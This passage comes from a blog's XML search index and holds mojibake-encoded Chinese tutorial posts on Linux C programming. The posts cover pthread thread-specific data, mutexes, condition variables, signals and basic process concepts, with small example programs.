class="literal">NULL</span>,thread1,<span class="literal">NULL</span>);               <span class="comment">//å››ä¸ªå‚æ•°ä¾æ¬¡æ˜¯çº¿ç¨‹ID,çº¿ç¨‹å±æ€§,è°ƒç”¨å‡½æ•°,å‡½æ•°å‚æ•°</span></span><br><span class="line">    sleep(<span class="number">10</span>);                                            <span class="comment">//ç¡çœ ä»¥ä½¿ä¸»çº¿ç¨‹ç­‰å¾…</span></span><br><span class="line">    pthread_key_delete(key);                              <span class="comment">//é”€æ¯é”®,ç§æœ‰æ•°æ®çš„é”€æ¯å¿…é¡»åœ¨å…¶ä¹‹å‰,ä¸ç„¶ä¼šå†…å­˜æ³„æ¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mian pthread ends \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tsd = <span class="number">5</span>;                                          <span class="comment">//pthreadä¸­çš„ç§æœ‰æ•°æ®</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thid_1;                                     <span class="comment">//åˆ†é…æ–°çš„çº¿ç¨‹å·</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pthread 1  %lu is running!\n&quot;</span>,pthread_self(  ));</span><br><span class="line">    pthread_setspecific(key,(<span class="keyword">void</span> *)tsd);                        <span class="comment">//ä½¿é”®ä¸ç§æœ‰æ•°æ®ç»‘å®š</span></span><br><span class="line">    pthread_create(&amp;thid_1,<span class="literal">NULL</span>,thread2,<span class="literal">NULL</span>);            <span class="comment">//åˆ›å»ºæ–°çº¿ç¨‹</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread1 %lu ends,pthread&#x27;s tsd is %d\n&quot;</span>,pthread_self(  ),pthread_getspecific(key));</span><br><span class="line">    sleep(<span class="number">5</span>);                                            <span class="comment">//ç¡çœ ä»¥ç­‰å¾…æ–°çº¿ç¨‹ç»“æŸ</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tsd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pthread 2 %lu is running\n&quot;</span>,pthread_self(  ));</span><br><span class="line">    pthread_setspecific(key,(<span class="keyword">void</span> *)tsd);                       <span class="comment">//ç»‘å®šé”®å€¼ä¸ç§æœ‰æ•°æ®</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thread %lu ends,thread&#x27;s tsd is %d\n&quot;</span>,pthread_self(  ),pthread_getspecific(key));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/c2p7mEWMRYJ1nBd.png" alt="image-20210213232526858"></p><h1 id="çº¿ç¨‹åŒæ­¥"><a href="#çº¿ç¨‹åŒæ­¥" class="headerlink" title="çº¿ç¨‹åŒæ­¥"></a>çº¿ç¨‹åŒæ­¥</h1><p>çº¿ç¨‹æœ€å¤§çš„ç‰¹ç‚¹æ˜¯èµ„æºçš„å…±äº«æ€§ï¼Œå…¶ä¸­çš„åŒæ­¥é—®é¢˜ååˆ†é‡è¦ã€‚ä»¥ä¸‹æ˜¯Linuxä¸­å¤„ç†åŒæ­¥é—®é¢˜çš„å¸¸ç”¨æ–¹å¼ã€‚</p><h2 id="äº’æ–¥é”"><a href="#äº’æ–¥é”" class="headerlink" title="äº’æ–¥é”"></a>äº’æ–¥é”</h2><p>äº’æ–¥é”é€šè¿‡é”æœºåˆ¶æ¥å®ç°çº¿ç¨‹é—´çš„åŒæ­¥ï¼Œåœ¨åŒä¸€ä¸ªæ—¶åˆ»å®ƒé€šå¸¸åªå…è®¸ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä¸€ä¸ªå…³é”®éƒ¨åˆ†çš„ä»£ç ã€‚</p><p>1ã€ä½¿ç”¨äº’æ–¥é”å‰å¿…é¡»å…ˆè¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚åˆå§‹åŒ–æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é™æ€èµ‹å€¼æ³•ï¼Œå°†å®ç»“æ„å¸¸é‡èµ‹ç»™äº’æ–¥é”ï¼Œå¦å¤–ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡<code>pthread_mutex_init</code>å‡½æ•°åˆå§‹åŒ–äº’æ–¥é”ã€‚</p><p>2ã€åˆå§‹åŒ–åå°±å¯ä»¥ç»™ç»™äº’æ–¥é”åŠ é”äº†ã€‚åŠ é”æœ‰ä¸¤ä¸ªå‡½æ•°:<code>pthread_mutex_lock()</code>å’Œ<code>pthread_mutex_trylock()</code>ã€‚ç”¨<code>pthread_mutex_lock()</code>åŠ é”çš„æ—¶å€™ï¼Œå¦‚æœmutexå·²ç»è¢«é”ä½ï¼Œå½“å‰å°è¯•åŠ é”çš„è¿›ç¨‹å°±ä¼šé˜»å¡ï¼Œç›´åˆ°äº’æ–¥é”è¢«å…¶ä»–çº¿ç¨‹é‡Šæ”¾ï¼Œå½“<code>pthread_mutex_lock</code>å‡½æ•°è¿”å›æ—¶ï¼Œè¯´æ˜äº’æ–¥é”å·²ç»è¢«å½“å‰è¿›ç¨‹æˆåŠŸåŠ é”ã€‚<code>pthread_mutex_trylock</code>å‡½æ•°åˆ™ä¸åŒï¼Œå¦‚æœmutexå·²ç»è¢«åŠ é”ï¼Œå®ƒå°†ç«‹å³è¿”å›ï¼Œè¿”å›çš„é”™è¯¯ç ä¸ºEBUSYï¼Œè€Œä¸æ˜¯é˜»å¡ç­‰å¾…ã€‚</p><p>3ã€ç”¨<code>pthread_mutex_unlock</code>å‡½æ•°è§£é”æ—¶ï¼Œè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼šä¸€æ˜¯äº’æ–¥é”å¿…é¡»å¤„äºåŠ é”çŠ¶æ€ï¼ŒäºŒæ˜¯è°ƒç”¨æœ¬å‡½æ•°çš„çº¿ç¨‹å¿…é¡»æ˜¯ç»™äº’æ–¥é”åŠ é”çš„çº¿ç¨‹ã€‚è§£é”åå¦‚æœæœ‰å…¶ä»–çº¿ç¨‹åœ¨ç­‰å¾…äº’æ–¥é”ï¼Œç­‰å¾…é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå°†è·å¾—äº’æ–¥é”</p><p>4ã€å½“ä¸€ä¸ªäº’æ–¥é”ä½¿ç”¨å®Œæ¯•åï¼Œå¿…é¡»è¿›è¡Œæ¸…é™¤ï¼Œæ¸…é™¤äº’æ–¥é”ä½¿ç”¨å‡½æ•°<code>pthread_mutex_destroy</code>ã€‚<br>æ¸…é™¤ä¸€ä¸ªäº’æ–¥é”æ„å‘³ç€é‡Šæ”¾å®ƒæ‰€å ç”¨çš„èµ„æºã€‚æ¸…é™¤é”æ—¶è¦æ±‚å½“å‰å¤„äºå¼€æ”¾çŠ¶æ€ï¼Œè‹¥é”å¤„äºé”å®šçŠ¶æ€ï¼Œå‡½æ•°æ”¾å›EBUSYï¼Œè¯¥å‡½æ•°æˆåŠŸä¹‹è¡Œæ—¶è¿”å›0ã€‚ç”±äºåœ¨Linuxä¸­ï¼Œäº’æ–¥é”å¹¶ä¸å ç”¨å†…å­˜ï¼Œå› æ­¤<code>pthread_mutex_destroy()</code>é™¤äº†è§£é™¤äº’æ–¥é”çš„çŠ¶æ€å¤–æ²¡æœ‰å…¶ä»–æ“ä½œã€‚</p><h2 id="æ¡ä»¶å˜é‡"><a href="#æ¡ä»¶å˜é‡" class="headerlink" title="æ¡ä»¶å˜é‡"></a>æ¡ä»¶å˜é‡</h2><p>æ¡ä»¶å˜é‡æ˜¯åˆ©ç”¨çº¿ç¨‹è§å…±äº«çš„å…¨å±€å˜é‡è¿›è¡ŒåŒæ­¥çš„ä¸€ç§æœºåˆ¶ã€‚æ¡ä»¶å˜é‡å®è§‚ä¸Šç±»ä¼¼ifè¯­å¥ï¼Œç¬¦åˆæ¡ä»¶å°±èƒ½æ‰§è¡ŒæŸæ®µç¨‹åºï¼Œå¦åˆ™åªèƒ½ç­‰å¾…æ¡ä»¶æˆç«‹ã€‚</p><p>ä½¿ç”¨æ¡ä»¶å˜é‡ä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªåŠ¨ä½œï¼šä¸€ä¸ªç­‰å¾…ä½¿ç”¨èµ„æºçš„çº¿ç¨‹ç­‰å¾…â€æ¡ä»¶å˜é‡è¢«è®¾ç½®ä¸ºçœŸâ€ï¼›å¦ä¸€ä¸ªçº¿ç¨‹åœ¨ä½¿ç”¨å®Œèµ„æºåâ€è®¾ç½®æ¡ä»¶ä¸ºçœŸâ€ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯çº¿ç¨‹é—´çš„åŒæ­¥äº†ã€‚è¿™æ ·å°±å­˜åœ¨ä¸€ä¸ªå…³é”®é—®é¢˜ï¼Œè¿™å°±æ˜¯è¦ä¿è¯æ¡ä»¶å˜é‡èƒ½è¢«æ­£ç¡®çš„ä¿®æ”¹ï¼Œæ¡ä»¶å˜é‡è¦å—åˆ°ç‰¹æ®Šçš„ä¿æŠ¤ï¼Œå®é™…ä½¿ç”¨ä¸­äº’æ–¥é”æ‰®æ¼”è€…è¿™æ ·ä¸€ä¸ªä¿æŠ¤è€…çš„è§’è‰²ã€‚Linuxä¹Ÿæä¾›äº†ä¸€ç³»åˆ—å¯¹æ¡ä»¶å˜é‡æ“ä½œçš„å‡½æ•°ã€‚</p><p>1ã€ä¸äº’æ–¥é”ä¸€æ ·ï¼Œæ¡ä»¶å˜é‡çš„åˆå§‹è¯ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é™æ€èµ‹å€¼æ³•ï¼Œå°†å®ç»“æ„å¸¸é‡PTHREAD_COND_INITIALIZERèµ‹ç»™äº’æ–¥é”ã€‚å¦ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨å‡½æ•°<code>pthread_cond_init</code>ã€‚</p><p>2ã€<code>pthread_cond_wait</code>å‡½æ•°é‡Šæ”¾æœ‰mutexæŒ‡å‘çš„äº’æ–¥é”ï¼ŒåŒæ—¶ä½¿å½“å‰çº¿ç¨‹å…³äºcondæ‰€æŒ‡å‘çš„æ¡ä»¶å˜é‡é˜»å¡ï¼Œç›´åˆ°æ¡ä»¶è¢«ä¿¡å·å”¤é†’ã€‚é€šå¸¸æ¡ä»¶è¡¨è¾¾å¼åœ¨äº’æ–¥é”çš„ä¿æŠ¤ä¸‹æ±‚å€¼ï¼Œå¦‚æœæ¡ä»¶è¡¨è¾¾å¼ä¸ºå‡ï¼Œé‚£ä¹ˆçº¿ç¨‹åŸºäºæ¡ä»¶å˜é‡é˜»å¡ã€‚å½“ä¸€ä¸ªçº¿ç¨‹æ”¹å˜æ¡ä»¶å˜é‡çš„åŒæ—¶ï¼Œæ¡ä»¶å˜é‡è·å¾—ä¸€ä¸ªä¿¡å·ï¼Œä½¿å¾—æ¡ä»¶å˜é‡çš„çº¿ç¨‹é€€å‡ºé˜»å¡çŠ¶æ€ã€‚<br><code>pthread_cond_timedwait</code>å‡½æ•°å’Œ<code>pthread_cond_wait</code>å‡½æ•°ç”¨æ³•ç±»ä¼¼ï¼Œå·®åˆ«åœ¨äº<code>pthread_cond_timedwait</code>å‡½æ•°å°†é˜»å¡ç›´åˆ°æ¡ä»¶å˜é‡è·å¾—ä¿¡å·æˆ–è€…ç»è¿‡abstimeæŒ‡å®šçš„æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ç»™å®šæ—¶åˆ»å‰æ¡ä»¶æ²¡æœ‰æ»¡è¶³ï¼Œåˆ™è¿”å›ETIMEOUTï¼Œç»“æŸç­‰å¾…ã€‚</p><p>3ã€çº¿ç¨‹è¢«æ¡ä»¶å˜é‡é˜»å¡åï¼Œå¯ä»¥é€šè¿‡å‡½æ•°<code>pthread_cond_signal</code>å’Œ<code>pthread_cond_broadcast</code>æ¿€æ´»ã€‚<br><code>pthread_cond_signal</code>æ¿€æ´»ä¸€ä¸ªç­‰å¾…æ¡ä»¶æˆç«‹çš„çº¿ç¨‹ï¼Œå­˜åœ¨å¤šä¸ªç­‰å¾…çº¿ç¨‹æ—¶ï¼ŒæŒ‰å…¥é˜Ÿé¡ºåºæ¿€æ´»å…¶ä¸­ä¸€ä¸ªï¼Œè€Œ<code>pthread_cond_broadcast</code>åˆ™æ¿€æ´»æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ã€‚</p><p>4ã€å½“ä¸€ä¸ªæ¡ä»¶å˜é‡ä¸å†ä½¿ç”¨æ—¶ï¼Œéœ€è¦å°†å…¶æ¸…é™¤ã€‚æ¸…é™¤ä¸€ä¸ªæ¡ä»¶å˜é‡é€šè¿‡è°ƒç”¨<code>pthread_cond_destroy()</code>å®ç°ã€‚<code>pthread_cond_destroy</code>å‡½æ•°æ¸…é™¤ç”±condæŒ‡å‘çš„æ¡ä»¶å˜é‡ã€‚æ³¨æ„ï¼šåªæœ‰åœ¨æ²¡æœ‰çº¿ç¨‹ç­‰å¾…è¯¥æ¡ä»¶å˜é‡çš„æ—¶å€™æ‰èƒ½æ¸…é™¤è¿™ä¸ªæ¡ä»¶å˜é‡ï¼Œå¦åˆ™è¿”å›EBUSYã€‚</p><p>ç¤ºä¾‹ä»£ç  <code>condition.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;unistd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hander</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    (<span class="keyword">void</span>)pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pthread_cleanup_push(hander, &amp;mutex);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread1 is running\n&quot;</span>);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">//æ¡ä»¶å˜é‡ä½¿ç”¨æ—¶é…åˆäº’æ–¥é”ä½¿ç”¨</span></span><br><span class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread1 applied the condition\n&quot;</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cleanup_pop(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread2 is running\n&quot;</span>);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread2 applied the condition\n&quot;</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid1,thid2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;condition variable study!\n&quot;</span>);</span><br><span class="line">    pthread_mutex_init(&amp;mutex,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;cond,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thid1,<span class="literal">NULL</span>,thread1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thid2,<span class="literal">NULL</span>,thread2,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        pthread_cond_signal(&amp;cond);</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">20</span>);</span><br><span class="line">    pthread_exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¼‚æ­¥ä¿¡å·"><a href="#å¼‚æ­¥ä¿¡å·" class="headerlink" title="å¼‚æ­¥ä¿¡å·"></a>å¼‚æ­¥ä¿¡å·</h2><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œçº¿ç¨‹æ˜¯åœ¨å†…æ ¸å¤–å®ç°çš„ï¼Œå®ƒä¸åƒè¿›ç¨‹é‚£æ ·åœ¨å†…æ ¸ä¸­å®ç°ï¼ŒLinuxçº¿ç¨‹æœ¬è´¨ä¸Šæ˜¯è½»é‡çº§çš„è¿›ç¨‹ã€‚ä¿¡å·å¯ä»¥è¢«è¿›ç¨‹ç”¨æ¥è¿›è¡Œç›¸äº’é€šä¿¡ï¼Œä¸€ä¸ªè¿›ç¨‹é€šè¿‡ä¿¡å·é€šçŸ¥å¦ä¸€ä¸ªè¿›ç¨‹å‘ç”Ÿäº†æŸä»¶äº‹ä»¶ï¼Œæ¯”å¦‚è¯¥è¿›ç¨‹æ‰€éœ€è¦çš„è¾“å…¥æ•°æ®å·²ç»å°±ç»ªã€‚çº¿ç¨‹åŒè¿›ç¨‹ä¸€æ ·ä¹Ÿå¯ä»¥æ¥æ”¶å’Œå¤„ç†ä¿¡å·ï¼Œä¿¡å·ä¹Ÿæ˜¯ä¸€ç§çº¿ç¨‹åŒæ­¥çš„æ‰‹æ®µã€‚</p><p>ä¿¡å·äºä»»ä½•çº¿ç¨‹éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¿¡å·åˆ°è¾¾çº¿ç¨‹çš„æ—¶é—´æ˜¯ä¸å®šçš„ã€‚å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹å¯ä»¥æ¥æ”¶å¼‚æ­¥ä¿¡å·ï¼Œåˆ™åªæœ‰ä¸€ä¸ªè¢«é€‰ä¸­ï¼Œå¦‚æœå¹¶å‘çš„å¤šä¸ªåŒæ ·çš„ä¿¡å·è¢«é€åˆ°ä¸€ä¸ªè¿›ç¨‹ï¼Œæ¯ä¸€ä¸ªå°†è¢«ä¸åŒçš„çº¿ç¨‹å¤„ç†ï¼Œå¦‚æœæ‰€æœ‰çš„çº¿ç¨‹éƒ½å±è”½è¯¥ä¿¡å·ï¼Œåˆ™è¿™äº›ä¿¡å·å°†è¢«æŒ‚èµ·ï¼Œç›´åˆ°æœ‰ä¿¡å·è§£é™¤å±è”½æ¥å¤„ç†å®ƒä»¬ã€‚å…¶ä¸­å‡½æ•°<code>pthread_kill</code>ç”¨æ¥å‘ç‰¹å®šçš„çº¿ç¨‹å‘é€ä¿¡å·signalï¼Œå‡½æ•°<code>pthread_sigmask</code>ç”¨æ¥è®¾ç½®çº¿ç¨‹çš„ä¿¡å·å±è”½ç ï¼Œä½†å¯¹ä¸å…è®¸å±è”½çš„Cancelä¿¡å·å’Œä¸å…è®¸ç›¸åº”çš„Restartä¿¡å·è¿›è¡Œäº†ä¿æŠ¤ï¼Œå‡½æ•°<code>sigwait</code>ç”¨æ¥é˜»å¡çº¿ç¨‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Cç¼–ç¨‹å®æˆ˜ä¹‹è¿›ç¨‹æ§åˆ¶å­¦ä¹ è®°å½•</title>
      <link href="posts/54831.html"/>
      <url>posts/54831.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ“ä½œç³»ç»Ÿå€ŸåŠ©äºè¿›ç¨‹æ¥ç®¡ç†è®¡ç®—æœºçš„è½¯ã€ç¡¬ä»¶èµ„æºï¼Œæ”¯æŒå¤šä»»åŠ¡çš„å¹¶è¡Œæ‰§è¡Œã€‚è€Œæ“ä½œç³»ç»Ÿæœ€æ ¸å¿ƒçš„æ¦‚å¿µå°±æ˜¯è¿›ç¨‹ã€‚ä»¥ä¸‹å¯¹è¿›ç¨‹ç›¸å…³çš„å­¦ä¹ å†…å®¹è¿›è¡Œç®€å•è®°å½•ã€‚</p><h1 id="è¿›ç¨‹æ¦‚è¿°"><a href="#è¿›ç¨‹æ¦‚è¿°" class="headerlink" title="è¿›ç¨‹æ¦‚è¿°"></a>è¿›ç¨‹æ¦‚è¿°</h1><h2 id="è¿›ç¨‹æ¦‚å¿µ"><a href="#è¿›ç¨‹æ¦‚å¿µ" class="headerlink" title="è¿›ç¨‹æ¦‚å¿µ"></a>è¿›ç¨‹æ¦‚å¿µ</h2><p>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèµ„æºç®¡ç†çš„æœ€å°å•ä½ï¼Œç®€å•åœ°è®²å°±æ˜¯è¿è¡Œä¸­çš„ç¨‹åºã€‚Linuxç³»ç»Ÿå¯ä»¥åŒæ—¶å¯åŠ¨å¤šä¸ªè¿›ç¨‹ã€‚</p><blockquote><p>è¿›ç¨‹å’Œç¨‹åºçš„åŒºåˆ«ï¼š</p><p>è¿›ç¨‹ï¼šæ˜¯åŠ¨æ€çš„ï¼Œè¿è¡Œä¸­çš„ç¨‹åºï¼›</p><p>ç¨‹åºï¼šæ˜¯é™æ€çš„ï¼Œä¸€äº›ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šçš„å¯æ‰§è¡Œçš„ä»£ç ã€‚</p></blockquote><blockquote><p>è¿›ç¨‹å’Œçº¿ç¨‹å…³ç³»ï¼š</p><p>è®¡ç®—æœºä¸ºåœ¨åŒä¸€æ—¶é—´æ‰§è¡Œæ›´å¤šä»»åŠ¡ï¼Œåœ¨è¿›ç¨‹å†…éƒ¨åˆåˆ’åˆ†äº†è®¸å¤šçº¿ç¨‹ã€‚çº¿ç¨‹æ˜¯æ¯”è¿›ç¨‹æ›´å°çš„èƒ½ç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å•ä½ã€‚ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åˆ›å»ºå’Œæ’¤é”€å¦ä¸€ä¸ªçº¿ç¨‹ï¼ŒåŒä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œã€‚</p></blockquote><p>LInuxä¸‹å¯é€šè¿‡å‘½ä»¤ <code>ps </code> æˆ– <code>pstree</code> æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­çš„è¿›ç¨‹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/a1xrtgTBdIhR2CM.png" alt="image-20210206220107548"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NjTwmiHU3hG5zCM.png" alt="image-20210206220235451"></p><h2 id="è¿›ç¨‹æ ‡è¯†"><a href="#è¿›ç¨‹æ ‡è¯†" class="headerlink" title="è¿›ç¨‹æ ‡è¯†"></a>è¿›ç¨‹æ ‡è¯†</h2><p>Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯é€šè¿‡å”¯ä¸€çš„è¿›ç¨‹idæ ‡è¯†çš„ã€‚è€Œè¿™ä¸ªidæ˜¯ä¸€ä¸ªéè´Ÿæ•°ï¼Œæ¯ä¸ªè¿›ç¨‹é™¤äº†idè¿˜æœ‰å…¶ä»–çš„æ ‡è¯†ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ç›¸åº”çš„å‡½æ•°è·å¾—ã€‚è¿™äº›å‡½æ•°åœ¨<code>unistd.h</code>å¤´æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pid_t getpid(id)                             è·å¾—è¿›ç¨‹id</span><br><span class="line">pdi_t getppid(id)                            è·å¾—è¿›ç¨‹çˆ¶è¿›ç¨‹çš„id</span><br><span class="line">pid_t getuid()                               è·å¾—è¿›ç¨‹çš„å®é™…ç”¨æˆ·id</span><br><span class="line">pid_t geteuid()                              è·å¾—è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·id</span><br><span class="line">pid_t getgid()                               è·å¾—è¿›ç¨‹çš„å®é™…ç»„id</span><br><span class="line">pid_t getegid()                              è·å¾—è¿›ç¨‹çš„æœ‰æ•ˆç»„id</span><br></pre></td></tr></table></figure><p><strong>å®é™…ç”¨æˆ·id:</strong> æ ‡è¯†è¿è¡Œè¯¥è¿›ç¨‹çš„ç”¨æˆ·ã€‚<br><strong>æœ‰æ•ˆç”¨æˆ·id</strong>: æ ‡è¯†ä»¥ä»€ä¹ˆç”¨æˆ·èº«ä»½æ¥è¿è¡Œè¿›ç¨‹ã€‚<br><strong>å®é™…ç»„id</strong>: å®ƒæ˜¯å®é™…ç”¨æˆ·æ‰€å±çš„ç»„id<br><strong>æœ‰æ•ˆç»„id</strong>ï¼šæœ‰æ•ˆç»„idæ˜¯æœ‰æ•ˆç”¨æˆ·æ‰€å±ç»„çš„id</p><h2 id="è¿›ç¨‹ç»“æ„"><a href="#è¿›ç¨‹ç»“æ„" class="headerlink" title="è¿›ç¨‹ç»“æ„"></a>è¿›ç¨‹ç»“æ„</h2><ul><li>ä»£ç æ®µï¼šå­˜æ”¾ç¨‹åºçš„å¯æ‰§è¡Œä»£ç ã€‚</li><li>æ•°æ®æ®µï¼šå­˜æ”¾ç¨‹åºçš„å…¨å±€å˜é‡ã€å¸¸é‡ã€é™æ€å˜é‡ã€‚</li><li>å †æ ˆæ®µï¼š<ul><li>å †ç”¨äºå­˜æ”¾åŠ¨æ€åˆ†é…çš„å†…å­˜å˜é‡ã€‚</li><li>æ ˆç”¨äºå‡½æ•°è°ƒç”¨ï¼Œå­˜æ”¾å‡½æ•°çš„å‚æ•°ï¼Œå†…éƒ¨å®šä¹‰çš„å±€éƒ¨å˜é‡ã€‚</li></ul></li></ul><h2 id="è¿›ç¨‹çŠ¶æ€"><a href="#è¿›ç¨‹çŠ¶æ€" class="headerlink" 